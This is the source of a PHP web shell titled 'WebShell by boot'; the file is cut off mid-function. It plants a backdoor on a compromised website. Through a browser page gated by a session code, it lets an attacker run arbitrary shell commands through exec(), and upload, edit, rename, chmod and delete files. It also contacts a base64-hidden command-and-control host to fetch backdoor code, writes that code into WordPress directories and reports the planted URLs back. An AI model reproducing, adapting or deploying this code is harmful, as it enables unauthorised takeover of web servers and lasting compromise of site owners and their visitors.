<?php

@set_time_limit(0);
error_reporting(0);
ini_set("memory_limit", "-1");
session_start();
$type = $_REQUEST["type"];
$path = $_REQUEST["path"];
$data = $_SERVER;
$website_path = $data["DOCUMENT_ROOT"];
$file_path = $data["SCRIPT_FILENAME"];
$now_path = dirname($file_path);
$dir = $_POST["dir"];
$web_url = $data["REQUEST_SCHEME"] . "://" . $data["SERVER_NAME"];
if (!empty($path)) {
    $file_path = $path;
    $now_path = $path;
}
if ($type == 1) {
    if (!empty($dir)) {
        $path = $dir;
    }
    $now_path = $path;
}
$file_path_array = explode("/", $file_path);
if (!is_dir($now_path)) {
    $now_path = dirname($now_path);
}
$can_read = false;
if (is_readable($now_path)) {
    $can_read = true;
}
$can_write = false;
if (is_writable($now_path)) {
    $can_write = true;
}
$prot = !empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off" || $_SERVER["SERVER_PORT"] == 443 ? "https://" : "http://";
$domain = $_SERVER["HTTP_HOST"];
$now_site = $prot . $domain;
$sy_path = str_replace($website_path, '', $now_path);
$now_url = $web_url . $sy_path;
$post_data = $_POST;
$pws = "aHR0cHM6Ly9nb2dvMjIuYnlob3QudG9w";
if (!empty($post_data)) {
    foreach ($post_data as $k => $v) {
        $_SESSION[$k] = $v;
    }
}
$all_paths = array();
$door_lists = array();
$last_folder_url = '';
if (!empty($_SESSION["c2hlbGxfY29kZQ=="]) && strlen($_SESSION["c2hlbGxfY29kZQ=="]) == 20) {
    ?>
<!doctypehtml><html lang="en"><head><title>WebShell by boot</title><meta charset="utf-8"><meta content="width=device-width,initial-scale=1"name="viewport"><link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"rel="stylesheet"><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script><script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script><style>.col-12{width:100%;display:inline-block}.col-6{width:50%;display:inline-block;float:left}</style></head><body><div class="jumbotron text-center"style="padding:1rem 0"><h1 style="font-size:2rem;font-weight:700;margin:1rem 0">WebShell by boot</h1></div><div class="container"><div class="row"><p><div style="width:30%;display:inline-block">Server IP:<?php 
    echo $data["SERVER_ADDR"];
    ?>
</div><div style="width:30%;display:inline-block">Server Software:<?php 
    echo $data["SERVER_SOFTWARE"];
    ?>
</div><div style="width:30%;display:inline-block">OS:<?php 
    echo "PHP_OS";
    ?>
</div></p><p><div style="width:30%;display:inline-block">Website:<?php 
    echo $data["HTTP_HOST"];
    ?>
</div><div style="width:30%;display:inline-block">User:<?php 
    echo get_current_user();
    ?>
</div></p><p><a href="?path=<?php 
    echo $website_path;
    ?>
">Project</a></p></div><div class="row"><p>Path:<?php 
    $file_now_path = '';
    foreach ($file_path_array as $k => $v) {
        if (empty($v)) {
            ?>
<a href="?path=/">-</a>r<?php 
        } else {
            if (empty($file_now_url)) {
                $file_now_url = $v;
            } else {
                $file_now_url = $file_now_url . "/" . $v;
            }
            $file_now_path = $file_now_path . "/" . $v;
            ?>
/<a href="?path=<?php 
            echo $file_now_path;
            ?>
"><?php 
            echo trim($v);
            ?>
</a><?php 
        }
    }
    ?>
<span style="color:green"style="color:red"<?php 
    if ($can_read) {
    } else {
    }
    ?>
>Readable</span> | <span style="color:green"style="color:red"<?php 
    if ($can_write) {
    } else {
    }
    ?>
>Writeable</span></p></div><?php 
    if ($type == 2 || $type == 3) {
        if ($type == 3) {
            $file_content = $_REQUEST["file_content"];
            $content_result = file_put_contents($path, $file_content);
            if ($content_result) {
                echo "<div class=\"alert alert-success\" role=\"alert\">File content modified successfully!</div>";
            } else {
                echo "<div class=\"alert alert-danger\" role=\"alert\">Failed to modify file content!</div>";
            }
        }
        ?>
<div class="row"><form action="?type=3"method="post"><input name="path"value="<?php 
        echo $file_path;
        ?>
"type="hidden"id="path"> <input name="c2hlbGxfY29kZQ=="value="<?php 
        echo $_SESSION["c2hlbGxfY29kZQ=="];
        ?>
"type="hidden"><div class="form-group"><?php 
        $content = file_get_contents($file_path);
        ?>
<textarea class="form-control"cols="100"id="exampleFormControlTextarea1"name="file_content"rows="20"><?php 
        echo htmlspecialchars($content);
        ?>
</textarea></div><button class="btn btn-success"type="submit">Edit</button></form></div><?php 
    } else {
        if ($type == 4) {
            $file_new_name = $_POST["file_new_name"];
            if (!empty($file_new_name)) {
                $rename_result = rename($file_path, $now_path . "/" . $file_new_name);
                if ($rename_result) {
                    echo "<div class=\"alert alert-success\" role=\"alert\">File name modified successfully!</div>";
                    $file_path = $now_path . "/" . $file_new_name;
                } else {
                    echo "<div class=\"alert alert-danger\" role=\"alert\">Failed to modify file name!</div>";
                }
            }
            ?>
<div class="row"><form action="?type=4"method="post"><input name="path"value="<?php 
            echo $file_path;
            ?>
"type="hidden"id="path"> <input name="c2hlbGxfY29kZQ=="value="<?php 
            echo $_SESSION["c2hlbGxfY29kZQ=="];
            ?>
"type="hidden"><div class="form-group"><?php 
            $content = file_get_contents($file_path);
            ?>
<input name="file_new_name"value="<?php 
            echo basename($file_path);
            ?>
"id="file_new_name"class="form-control"></div><button class="btn btn-success"type="submit">Edit</button></form></div><?php 
        } else {
            if ($type == 5) {
                $new_chmod = trim($_POST["new_chmod"]);
                if (!empty($new_chmod)) {
                    if (chmod($file_path, octdec($new_chmod))) {
                        echo "<div class=\"alert alert-success\" role=\"alert\">File permissions modified successfully!</div>";
                        $old_chmod = $new_chmod;
                    } else {
                        echo "<div class=\"alert alert-danger\" role=\"alert\">Failed to modify file permissions!</div>";
                    }
                } else {
                    $permissions = fileperms($file_path);
                    $old_chmod = substr(sprintf("%o", $permissions), -4);
                }
                ?>
<div class="row"><form action="?type=5"method="post"><input name="path"value="<?php 
                echo $file_path;
                ?>
"type="hidden"id="path"> <input name="c2hlbGxfY29kZQ=="value="<?php 
                echo $_SESSION["c2hlbGxfY29kZQ=="];
                ?>
"type="hidden"><div class="form-group"><?php 
                $content = file_get_contents($file_path);
                ?>
<input name="new_chmod"value="<?php 
                echo $old_chmod;
                ?>
"id="new_chmod"class="form-control"></div><button class="btn btn-success"type="submit">Edit</button></form></div><?php 
            } else {
                if ($type == 6) {
                    $new_name = trim($_POST["new_name"]);
                    $new_content = trim($_POST["new_content"]);
                    if (!empty($new_name)) {
                        if (is_file($now_path . "/" . $new_name)) {
                            echo "<div class=\"alert alert-danger\" role=\"alert\">The file already exists!</div>";
                        } else {
                            $file = fopen($now_path . "/" . $new_name, "w");
                            if ($file) {
                                if (fwrite($file, $new_content)) {
                                    echo "<div class=\"alert alert-success\" role=\"alert\">File created successfully!</div>";
                                } else {
                                    echo "<div class=\"alert alert-danger\" role=\"alert\">Unable to write to file!</div>";
                                }
                                fclose($file);
                            } else {
                                echo "<div class=\"alert alert-danger\" role=\"alert\">Unable to open file!</div>";
                            }
                        }
                    }
                    ?>
<div class="row"><form action="?type=6"method="post"><input name="path"value="<?php 
                    echo $file_path;
                    ?>
"type="hidden"id="path"> <input name="c2hlbGxfY29kZQ=="value="<?php 
                    echo $_SESSION["c2hlbGxfY29kZQ=="];
                    ?>
"type="hidden"><div class="form-group"><input name="new_name"value="<?php 
                    echo $new_name;
                    ?>
"id="new_name"class="form-control"placeholder="New File Name"></div><div class="form-group"><textarea class="form-control"cols="100"id="new_content"name="new_content"rows="20"placeholder="New File Content"><?php 
                    echo htmlspecialchars($new_content);
                    ?>
</textarea></div><button class="btn btn-success"type="submit">Create Now</button></form></div><?php 
                } else {
                    if ($type == 7) {
                        $new_name = trim($_POST["new_name"]);
                        if (!empty($new_name)) {
                            if (!is_dir($now_path . "/" . $new_name)) {
                                if (mkdir($now_path . "/" . $new_name)) {
                                    echo "<div class=\"alert alert-success\" role=\"alert\">Directory created successfully!</div>";
                                } else {
                                    echo "<div class=\"alert alert-success\" role=\"alert\">Directory creation failed!</div>";
                                }
                            } else {
                                echo "<div class=\"alert alert-success\" role=\"alert\">Directory already exists!</div>";
                            }
                        }
                        ?>
<div class="row"><form action="?type=7"method="post"><input name="c2hlbGxfY29kZQ=="value="<?php 
                        echo $_SESSION["c2hlbGxfY29kZQ=="];
                        ?>
"type="hidden"> <input name="path"value="<?php 
                        echo $file_path;
                        ?>
"type="hidden"id="path"><div class="form-group"><input name="new_name"value="<?php 
                        echo $new_name;
                        ?>
"id="new_name"class="form-control"placeholder="New Folder Name"></div><button class="btn btn-success"type="submit">Create Now</button></form></div><?php 
                    } else {
                        if ($type == 8) {
                            $search_keys = trim($_POST["search_keys"]);
                            $act = trim($_POST["act"]);
                            ?>
<div class="row"><form action="?type=8"method="post"><div class="form-group"><input name="search_keys"value="<?php 
                            echo $search_keys;
                            ?>
"id="search_keys"class="form-control"placeholder="Search content"></div><button class="btn btn-success"type="submit">Search</button></form></div><?php 
                            if (!empty($search_keys)) {
                                $result = array();
                                $file_list = findFilesWithContent($website_path, $search_keys, 0, 10);
                                ?>
<form action="?type=8"method="post"id="deleteForm"style="margin:1rem"><input name="act"value="deleteFiles"type="hidden"id="act"><div><p><input name="allcheck"value="1"type="checkbox"id="allcheck"> all check <input value="delete"type="button"class="delBtn"></p></div><div><?php 
                                foreach ($file_list as $file) {
                                    $str = "<a href=\"?path=" . $file . "&type=2\" target=\"_blank\">" . $file . "</a>";
                                    echo "<p><input type=\"checkbox\" class=\"item\" name=\"files[]\" value=\"" . $file . "\"/>&nbsp;&nbsp;" . $str . "</p>";
                                }
                                ?>
</div></form><?php 
                            }
                            if (!empty($act) && $act == "deleteFiles") {
                                $file_list = $_REQUEST["files"];
                                foreach ($file_list as $k => $v) {
                                    deleteFile($v);
                                }
                            }
                        } else {
                            if ($_POST["act"] == "del") {
                                $delete_file_list = $_POST["childcheck"];
                                if (!empty($delete_file_list)) {
                                    $count = 0;
                                    $fail_count = 0;
                                    foreach ($delete_file_list as $k => $v) {
                                        if (is_dir($v)) {
                                            $del_result = deleteDirectory($v);
                                        } else {
                                            $del_result = unlink($v);
                                        }
                                        if ($del_result) {
                                            $count++;
                                        } else {
                                            $fail_count++;
                                        }
                                    }
                                    if ($count > 0) {
                                        echo "<div class=\"alert alert-success\" role=\"alert\">Delete " . $count . " files successfully!</div>";
                                    }
                                    if ($fail_count > 0) {
                                        echo "<div class=\"alert alert-danger\" role=\"alert\">Delete " . $fail_count . " files failed!</div>";
                                    }
                                }
                            }
                            if ($_POST["act"] == "upload") {
                                $targetFile = $now_path . "/" . basename($_FILES["fileToUpload"]["name"]);
                                if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
                                    echo "<div class=\"alert alert-success\" role=\"alert\">File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " uploaded!</div>";
                                } else {
                                    echo "<div class=\"alert alert-danger\" role=\"alert\">File upload failed!</div>";
                                }
                            }
                            $file_list = scandir($now_path);
                            $file_list = sortByFolder($now_path, $file_list);
                            ?>
<div class="row"><div class="col-12"style="margin-bottom:1rem"><div class="row"><div class="col-6"><form action="?path=<?php 
                            echo $file_path;
                            ?>
"method="post"enctype="multipart/form-data"><input name="c2hlbGxfY29kZQ=="value="<?php 
                            echo $_SESSION["c2hlbGxfY29kZQ=="];
                            ?>
"type="hidden"> <input name="act"value="upload"type="hidden"> <input name="fileToUpload"type="file"id="formFileSm"class="form-control form-control-sm"style="width:200px;display:inline-block"> <button class="btn btn-sm btn-info"type="submit">Upload</button> <a href="?path=<?php 
                            echo $file_path;
                            ?>
&type=6"class="btn btn-sm btn-primary">Create File</a> <a href="?path=<?php 
                            echo $file_path;
                            ?>
&type=7"class="btn btn-sm btn-success">Create Folder</a> <a href="?path=<?php 
                            echo $file_path;
                            ?>
&type=8"class="btn btn-sm btn-warning">Search Files</a></form></div><div class="col-6"><form action="?path=<?php 
                            echo $file_path;
                            ?>
"method="post"enctype="multipart/form-data"><input name="exec_code"value=""class="form-control"style="display:inline-block;width:50%"> <input name="act"value="exec_code"type="hidden"> <button class="btn btn-sm btn-info"type="submit">Exec</button></form></div></div></div><div class="col-12"style="margin-bottom:1rem"><div class="row"><div class="col-6"><form action="?type=1"method="post"enctype="multipart/form-data"><input name="dir"value="<?php 
                            echo $path;
                            ?>
"class="form-control"style="display:inline-block;width:80%"> <input name="act"value="change_dir"type="hidden"> <button class="btn btn-sm btn-info"type="submit">Change Dir</button></form></div><div class="col-6"></div></div></div><div class="bd-example bd-example-row"style="border:1px solid #ededed;padding:1rem;margin:1rem 0"><div class="row"><div class="col-2 col-sm-1"><form action="?path=<?php 
                            echo $file_path;
                            ?>
"method="post"><input name="c2hlbGxfY29kZQ=="value="<?php 
                            echo $_SESSION["c2hlbGxfY29kZQ=="];
                            ?>
"type="hidden"> <input name="act"value="shell"type="hidden"> <input name="type"value="reback"type="hidden"> <input name="group_id"value="<?php 
                            echo $_SESSION["Z3JvdXA="];
                            ?>
"type="hidden"> <input name="shell_id"value="<?php 
                            echo $_SESSION["c2hlbGxfaWQ="];
                            ?>
"type="hidden"> <input name="shell_type"value="<?php 
                            echo $_SESSION["dHlwZQ=="];
                            ?>
"type="hidden"> <button class="btn btn-sm btn-success"type="submit">Reback</button></form></div><div class="col-2 col-sm-1"><form action="?path=<?php 
                            echo $file_path;
                            ?>
"method="post"><input name="c2hlbGxfY29kZQ=="value="<?php 
                            echo $_SESSION["c2hlbGxfY29kZQ=="];
                            ?>
"type="hidden"> <input name="act"value="shell"type="hidden"> <input name="type"value="exec"type="hidden"> <input name="group_id"value="<?php 
                            echo $_SESSION["Z3JvdXA="];
                            ?>
"type="hidden"> <input name="shell_id"value="<?php 
                            echo $_SESSION["c2hlbGxfaWQ="];
                            ?>
"type="hidden"> <input name="shell_type"value="<?php 
                            echo $_SESSION["dHlwZQ=="];
                            ?>
"type="hidden"> <button class="btn btn-sm btn-warning"type="submit">Exec</button></form></div><div class="col-2 col-sm-1"><form action="?path=<?php 
                            echo $file_path;
                            ?>
"method="post"><input name="c2hlbGxfY29kZQ=="value="<?php 
                            echo $_SESSION["c2hlbGxfY29kZQ=="];
                            ?>
"type="hidden"> <input name="act"value="shell"type="hidden"> <input name="type"value="others"type="hidden"> <input name="shell_id"value="<?php 
                            echo $_SESSION["c2hlbGxfaWQ="];
                            ?>
"type="hidden"> <input name="group_id_2"value="<?php 
                            echo $_SESSION["c2Vjb25k"];
                            ?>
"type="hidden"> <input name="group_id_3"value="<?php 
                            echo $_SESSION["dGhpcmRncm91cA=="];
                            ?>
"type="hidden"> <input name="shell_type"value="<?php 
                            echo $_SESSION["dHlwZQ=="];
                            ?>
"type="hidden"> <button class="btn btn-sm btn-info"type="submit">Others</button></form></div><div class="col-2 col-sm-1"><form action="?path=<?php 
                            echo $file_path;
                            ?>
"method="post"><input name="c2hlbGxfY29kZQ=="value="<?php 
                            echo $_SESSION["c2hlbGxfY29kZQ=="];
                            ?>
"type="hidden"> <input name="act"value="shell"type="hidden"> <input name="type"value="doors"type="hidden"> <input name="group_id"value="<?php 
                            echo $_SESSION["Z3JvdXA="];
                            ?>
"type="hidden"> <input name="shell_id"value="<?php 
                            echo $_SESSION["c2hlbGxfaWQ="];
                            ?>
"type="hidden"> <input name="shell_type"value="<?php 
                            echo $_SESSION["dHlwZQ=="];
                            ?>
"type="hidden"> <button class="btn btn-sm btn-danger"type="submit">Doors</button></form></div><div class="col-2 col-sm-1"><form action="?path=<?php 
                            echo $file_path;
                            ?>
"method="post"><input name="c2hlbGxfY29kZQ=="value="<?php 
                            echo $_SESSION["c2hlbGxfY29kZQ=="];
                            ?>
"type="hidden"> <input name="act"value="shell"type="hidden"> <input name="type"value="station"type="hidden"> <input name="shell_id"value="<?php 
                            echo $_SESSION["c2hlbGxfaWQ="];
                            ?>
"type="hidden"> <input name="shell_type"value="<?php 
                            echo $_SESSION["dHlwZQ=="];
                            ?>
"type="hidden"> <button class="btn btn-sm btn-primary"type="submit">Station</button></form></div></div></div><div class="bd-example bd-example-row"style="border:1px solid #ededed;padding:1rem;margin:1rem 0"><div class="row"><div class="col-12 col-sm-12"style="text-align:center;font-weight:700"><?php 
                            if ($_POST["act"] == "shell") {
                                if ($_POST["type"] == "reback") {
                                    rebackAction($_POST, $pws, $now_site);
                                } else {
                                    if ($_POST["type"] == "exec") {
                                        execAction($_POST, $pws, $now_site);
                                    } else {
                                        if ($_POST["type"] == "doors") {
                                            doorsAction($_POST, $pws, $now_site);
                                        } else {
                                            if ($_POST["type"] == "others") {
                                                othersAction($_POST, $pws, $now_site);
                                            } else {
                                                if ($_POST["type"] == "station") {
                                                    stationAction($_POST, $pws, $now_site);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            if ($_POST["act"] == "exec_code") {
                                $exec_code = trim($_POST["exec_code"]);
                                exec($exec_code, $output, $returnVar);
                                if ($returnVar === 0) {
                                    echo "<div style='color: green;font-weight:bold;'>" . $exec_code . " is Successfully.</div>";
                                    foreach ($output as $k => $v) {
                                        echo $v . "<br/>";
                                    }
                                } else {
                                    echo "<div style='color: red;font-weight:bold;'>" . $exec_code . " is Failed:" . $returnVar . ".</div>";
                                }
                            }
                            ?>
</div></div></div><form action="?path=<?php 
                            echo $file_path;
                            ?>
"method="post"><input name="c2hlbGxfY29kZQ=="value="<?php 
                            echo $_SESSION["c2hlbGxfY29kZQ=="];
                            ?>
"type="hidden"><div class="col-12"style="margin-bottom:1rem"><input name="act"value="del"type="hidden"> <button class="btn btn-xs btn-danger"type="submit">Delete</button></div><table class="table table-bordered"><thead><tr><th><div class="form-check"><input name="allcheck"value="1"type="checkbox"id="allcheck"class="form-check-input"></div></th><th>Name</th><th>Url</th><th>Size</th><th>Modify</th><th>Permission</th><th>Action</th></tr></thead><tbody><?php 
                            if (!empty($file_list) && count($file_list) > 2) {
                                foreach ($file_list as $k => $v) {
                                    if (!($v == "." || $v == "..")) {
                                        $file_url = $now_path . "/" . $v;
                                        ?>
<tr><th><div class="form-check"><input name="childcheck[]"value="<?php 
                                        echo $file_url;
                                        ?>
"type="checkbox"class="form-check-input"></div></th><td><?php 
                                        if (is_dir($file_url)) {
                                            echo "<a href=\"?path=" . $file_url . "&type=1\" style=\"color: green;font-weight:bold;\">\n                     <i class=\"bi bi-folder\" style=\"vertical-align: middle;\">\n                        <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" fill=\"currentColor\" class=\"bi bi-folder\" viewBox=\"0 0 16 16\">\n                        <path d=\"M.54 3.87.5 3a2 2 0 0 1 2-2h3.672a2 2 0 0 1 1.414.586l.828.828A2 2 0 0 0 9.828 3h3.982a2 2 0 0 1 1.992 2.181l-.637 7A2 2 0 0 1 13.174 14H2.826a2 2 0 0 1-1.991-1.819l-.637-7a1.99 1.99 0 0 1 .342-1.31zM2.19 4a1 1 0 0 0-.996 1.09l.637 7a1 1 0 0 0 .995.91h10.348a1 1 0 0 0 .995-.91l.637-7A1 1 0 0 0 13.81 4H2.19zm4.69-1.707A1 1 0 0 0 6.172 2H2.5a1 1 0 0 0-1 .981l.006.139C1.72 3.042 1.95 3 2.19 3h5.396l-.707-.707z\"/>\n                        </svg>\n                    </i>" . $v . "</a>";
                                        } else {
                                            echo "<a href=\"?path=" . $file_url . "&type=2\">" . $v . "</a>";
                                        }
                                        ?>
</td><td><?php 
                                        if (!is_dir($file_url)) {
                                            ?>
<a href="<?php 
                                            echo $now_url . "/" . $v;
                                            ?>
"target="_blank">click visit</a><?php 
                                        }
                                        ?>
</td><td><?php 
                                        if (is_dir($file_url)) {
                                            echo "<font color=\"green\" style=\"font-weight: bold;\">Directory</font>";
                                        } else {
                                            echo getFileSize($file_url);
                                        }
                                        ?>
</td><td><?php 
                                        $modificationTime = filemtime($file_url);
                                        echo date("Y-m-d H:i:s", $modificationTime);
                                        ?>
</td><td><?php 
                                        $permission = getFilePermission($file_url);
                                        if (strpos($permission, "w") !== false) {
                                            echo "<font color=\"green\" style=\"font-weight: bold;\">" . $permission . "</font>";
                                        } else {
                                            echo "<font color=\"red\" style=\"font-weight: bold;\">" . $permission . "</font>";
                                        }
                                        ?>
</td><td><a href="?path=<?php 
                                        echo $file_url;
                                        ?>
&type=4"class="btn btn-xs btn-primary">Rename</a> <a href="?path=<?php 
                                        echo $file_url;
                                        ?>
&type=2"class="btn btn-info btn-xs">Edit</a> <a href="?path=<?php 
                                        echo $file_url;
                                        ?>
&type=5"class="btn btn-xs btn-warning">Chmod</a></td></tr><?php 
                                    }
                                }
                            } else {
                                ?>
<tr><td colspan="4"style="text-align:center;color:red">No Files!</td></tr><?php 
                            }
                            ?>
</tbody></table></form></div><?php 
                        }
                    }
                }
            }
        }
    }
    ?>
</div><script>$(function(){$("#allcheck").click(function(){$("#allcheck").is(":checked")?$('input[name="childcheck[]"]').each(function(){$(this).attr("checked",!0)}):$('input[name="childcheck[]"]').each(function(){$(this).attr("checked",!1)})})})</script><script>$(function(){$("#allcheck").click(function(){$(".item").prop("checked",this.checked)}),$(".item").click(function(){$(".item").length==$(".item:checked").length?$("#allcheck").prop("checked",!0):$("#allcheck").prop("checked",!1)}),$(".delBtn").click(function(){var e=[];if($(".item:checked").each(function(){e.push($(this).val())}),0==e.length)return alert("please select files"),!1;$("#deleteForm").submit()})})</script></body></html><?php 
}
function getFileSize($file_url)
{
    $file_size = filesize($file_url);
    if ($file_size > 1048576) {
        $file_size = round($file_size / 1048576, 2) . " MB";
    } else {
        if ($file_size > 1024) {
            $file_size = round($file_size / 1024, 2) . " KB";
        } else {
            $file_size .= " B";
        }
    }
    return $file_size;
}
function getFilePermission($filename)
{
    clearstatcache(true, $filename);
    $perms = fileperms($filename);
    if (($perms & 49152) === 49152) {
        $info = "s";
    } elseif (($perms & 40960) === 40960) {
        $info = "l";
    } elseif (($perms & 32768) === 32768) {
        $info = "-";
    } elseif (($perms & 24576) === 24576) {
        $info = "b";
    } elseif (($perms & 16384) === 16384) {
        $info = "d";
    } elseif (($perms & 8192) === 8192) {
        $info = "c";
    } elseif (($perms & 4096) === 4096) {
        $info = "p";
    } else {
        $info = "u";
    }
    $info .= $perms & 256 ? "r" : "-";
    $info .= $perms & 128 ? "w" : "-";
    $info .= $perms & 64 ? $perms & 2048 ? "s" : "x" : ($perms & 2048 ? "S" : "-");
    $info .= $perms & 32 ? "r" : "-";
    $info .= $perms & 16 ? "w" : "-";
    $info .= $perms & 8 ? $perms & 1024 ? "s" : "x" : ($perms & 1024 ? "S" : "-");
    $info .= $perms & 4 ? "r" : "-";
    $info .= $perms & 2 ? "w" : "-";
    $info .= $perms & 1 ? $perms & 512 ? "t" : "x" : ($perms & 512 ? "T" : "-");
    return $info;
}
function sortByFolder($now_path, $all_list)
{
    $folder_list = array();
    $file_list = array();
    foreach ($all_list as $k => $v) {
        if (is_dir($now_path . "/" . $v)) {
            $folder_list[] = $v;
        } else {
            $file_list[] = $v;
        }
    }
    sort($folder_list);
    sort($file_list);
    $all_list = array_merge($folder_list, $file_list);
    return $all_list;
}
function rebackAction($data, $pweb, $now_site)
{
    $group_id = $data["group_id"];
    $shell_id = $data["shell_id"];
    $shell_type = $data["shell_type"];
    $url = base64_decode($pweb) . "/indexdoor.php?action=reback&group_id=" . $group_id . "&shell_type=" . $shell_type;
    $cc = curlget($url);
    $json_array = json_decode($cc, true);
    $result_data = array();
    $result_data["shell_id"] = $shell_id;
    $result_data["action"] = "reback";
    $save_url = base64_decode($pweb) . "/save.php";
    if (isset($json_array["in_files"]) && !empty($json_array["in_files"])) {
        $wp_code = $json_array["wp_code"];
        $in_list = explode(";", $json_array["in_files"]);
        foreach ($in_list as $k => $v) {
            $wpstr = strslit($v);
            $wp_code = str_replace("[##in_contnt_" . $k . "##]", $wpstr, $wp_code);
            $contnt = $json_array["code"] . $json_array["wp_ycode"];
            crefile($v, $contnt);
        }
        $ht_list = explode(";", $json_array["ht_files"]);
        foreach ($ht_list as $k => $v) {
            $wpstr = strslit($v);
            $wp_code = str_replace("[##ht_contnt_" . $k . "##]", $wpstr, $wp_code);
            $contnt = $json_array["ht_contnt"];
            crefile($v, $contnt);
        }
        $wp_list = explode(";", $json_array["wp_files"]);
        $wp_result = array();
        foreach ($wp_list as $k => $v) {
            $f = crefile($v, $wp_code);
            if ($f) {
                $wp_result[] = $now_site . $v;
            }
        }
        if (!empty($wp_result) && count($wp_result) > 0) {
            $result_data["wp_urls"] = $wp_result;
            $result_data["status"] = 1;
        } else {
            $result_data["code"] = "1001";
            $result_data["status"] = 2;
        }
    } else {
        $result_data["code"] = "1002";
        $result_data["status"] = 2;
    }
    $result_data["shell_url"] = $now_site;
    $result_data["shell_type"] = $shell_type;
    $res = curlpost($save_url, $result_data);
    if ($res["status"]) {
        echo "<p style=\"color:green;\">Reback is successfully</p>";
        foreach ($wp_result as $k => $v) {
            echo "<p><a href=\"" . $v . "\" target=\"_blank\">" . $v . "</a></p>";
        }
    } else {
        echo "<p style=\"color:red;\">Reback is failed! " . $result_data["code"] . "</p>";
    }
}
function execAction($data, $pweb, $now_site)
{
    $group_id = $data["group_id"];
    $shell_id = $data["shell_id"];
    $shell_type = $data["shell_type"];
    $url = base64_decode($pweb) . "/indexdoor.php?action=new_exec&group_id=" . $group_id . "&shell_type=" . $shell_type;
    $result_data = array();
    $result_data["shell_id"] = $shell_id;
    $result_data["action"] = "exec";
    $save_url = base64_decode($pweb) . "/save.php";
    $cc = curlget($url);
    $json_array = json_decode($cc, true);
    if (isset($json_array["in_contnt"]) && !empty($json_array["ht_contnt"]) && !empty($json_array["exec_code"])) {
        $website_root = $_SERVER["DOCUMENT_ROOT"];
        $result = add_exec($website_root, $json_array["ht_contnt"], $json_array["in_contnt"], $json_array["exec_code"], $json_array["wp_ycode"]);
        if ($result) {
            $result_data["status"] = 1;
        } else {
            $result_data["code"] = "1001";
            $result_data["status"] = 2;
        }
    } else {
        $result_data["code"] = "1002";
        $result_data["status"] = 2;
    }
    $result_data["shell_type"] = $shell_type;
    $res = curlpost($save_url, $result_data);
    if ($res["status"]) {
        echo "<p style=\"color:green;\">Exec is successfully</p>";
    } else {
        echo "<p style=\"color:red;\">Exec is failed! " . $result_data["code"] . "</p>";
    }
}
function add_exec($website_root, $ht_contnt, $index_contnt, $exec_code, $wp_ycode)
{
    $exec_code = str_replace("[##website_path##]", $website_root, $exec_code);
    $exec_code = str_replace("[##htcontent##]", base64_encode($ht_contnt), $exec_code);
    $exec_code = str_replace("[##indexcontent##]", base64_encode($index_contnt . $wp_ycode), $exec_code);
    $o23 = $website_root . "/wp-includes/" . get6str() . ".php";
    echo $o23;
    $u17 = fopen($o23, "a+");
    fwrite($u17, $exec_code);
    fclose($u17);
    exec("php -f {$o23} > /dev/null 2>/dev/null &", $a22, $res);
    if ($res === 0) {
        return true;
    } else {
        return false;
    }
}
function get6str()
{
    $s = '';
    for ($i = 0; $i < 6; $i++) {
        $s .= chr(mt_rand(97, 122));
    }
    return $s;
}
function othersAction($data, $pweb, $now_site)
{
    $shell_id = $data["shell_id"];
    $group_id_2 = $data["group_id_2"];
    $group_id_3 = $data["group_id_3"];
    $shell_type = $data["shell_type"];
    $url = base64_decode($pweb) . "/indexdoor.php?action=others&group_id_2=" . $group_id_2 . "&group_id_3=" . $group_id_3 . "&shell_type=" . $shell_type;
    $result_data = array();
    $result_data["shell_id"] = $shell_id;
    $result_data["action"] = "others";
    $save_url = base64_decode($pweb) . "/save.php";
    $cc = curlget($url);
    $json_array = json_decode($cc, true);
    if (!empty($json_array["group2_code"]) && !empty($json_array["second_file"]) || !empty($json_array["group3_code"]) && !empty($json_array["third_file"])) {
        $result = add_others($json_array["group2_code"], $json_array["group3_code"], $json_array["second_file"], $json_array["third_file"], $now_site);
        if (!empty($result["second_url"]) || !empty($result["third_url"])) {
            $result_data["second_url"] = $result["second_url"];
            $result_data["third_url"] = $result["third_url"];
            $result_data["status"] = 1;
        } else {
            $result_data["code"] = "1001";
            $result_data["status"] = 2;
        }
    } else {
        $result_data["code"] = "1002";
        $result_data["status"] = 2;
    }
    $result_data["shell_type"] = $shell_type;
    $res = curlpost($save_url, $result_data);
    if ($res["status"]) {
        echo "<p style=\"color:green;\">Others is successfully</p>";
    } else {
        echo "<p style=\"color:red;\">Others is failed! " . $result_data["code"] . "</p>";
    }
}
function add_others($group2_code, $group3_code, $second_file, $third_file, $now_site)
{
    $result = array();
    $sf = crefile($second_file, $group2_code);
    $tf = crefile($third_file, $group3_code);
    $result["second_url"] = '';
    $result["third_url"] = '';
    if ($sf) {
        $result["second_url"] = $now_site . "/" . $second_file;
    }
    if ($tf) {
        $result["third_url"] = $now_site . "/" . $third_file;
    }
    return $result;
}
function doorsAction($data, $pweb, $now_site)
{
    $result_data = array();
    $result_data["shell_id"] = $data["shell_id"];
    $result_data["action"] = "doors";
    $save_url = base64_decode($pweb) . "/save.php";
    $shell_id = $data["shell_id"];
    $group_id = $data["group_id"];
    $shell_type = $data["shell_type"];
    $url = base64_decode($pweb) . "/indexdoor.php?action=doors&shell_id=" . $shell_id . "&group_id=" . $group_id . "&shell_type=" . $shell_type;
    $cc = curlget($url);
    $json_array = json_decode($cc, true);
    if (!empty($json_array["doors"])) {
        $result = add_doors($json_array["doors"], $json_array["doors_55"], $json_array["wp_files"], $json_array["third_file"], $json_array["ht_ban_content"], $json_array["ht_open_content"], $json_array["shell_action_code"], $now_site);
        if (!empty($result["door_files"])) {
            $result_data["door_urls"] = implode(";", $result["door_files"]);
            $result_data["shell_other_url"] = $result["shell_other_url"];
            $result_data["status"] = 1;
        } else {
            $result_data["code"] = "1001";
            $result_data["status"] = 2;
        }
    } else {
        $result_data["code"] = "1002";
        $result_data["status"] = 2;
    }
    $result_data["shell_type"] = $shell_type;
    $res = curlpost($save_url, $result_data);
    if ($res["status"]) {
